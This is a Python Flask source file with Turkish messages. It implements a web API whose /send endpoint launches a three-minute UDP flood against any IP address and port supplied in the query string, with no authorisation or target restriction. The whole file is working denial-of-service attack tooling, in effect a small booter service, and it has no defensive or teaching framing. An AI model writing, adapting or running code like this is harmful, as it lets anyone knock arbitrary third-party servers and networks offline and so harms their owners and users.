# app.py
from flask import Flask, request, jsonify
import socket
import random
import threading
import time

app = Flask(__name__)

# Global kontrol (tek seferde sadece bir saldırı)
attack_active = False
attack_thread = None

def udp_flood(ip, port, duration=120):
    global attack_active
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        end_time = time.time() + duration
        
        while time.time() < end_time and attack_active:
            sock.sendto(payload, (ip, port))
        
        sock.close()
    except:
        pass
    finally:
        attack_active = False

@app.route('/send', methods=['GET'])
def send_attack():
    global attack_active, attack_thread
    
    ip = request.args.get('ip')
    port = request.args.get('port')
    
    if not ip or not port:
        return jsonify({"error": "ip ve port parametreleri zorunlu"}), 400
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            return jsonify({"error": "geçersiz port"}), 400
    except:
        return jsonify({"error": "port sayı olmalı"}), 400

    if attack_active:
        return jsonify({"status": "zaten bir saldırı çalışıyor"}), 429

    attack_active = True
    attack_thread = threading.Thread(target=udp_flood, args=(ip, port, 180))
    attack_thread.daemon = True
    attack_thread.start()

    return jsonify({
        "status": "ok",
        "message": f"saldırı başladı → {ip}:{port} (3 dk)",
        "duration": 180
    })

@app.route('/')
def home():
    return "API çalışıyor. Kullanım: /send?ip=1.2.3.4&port=80"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
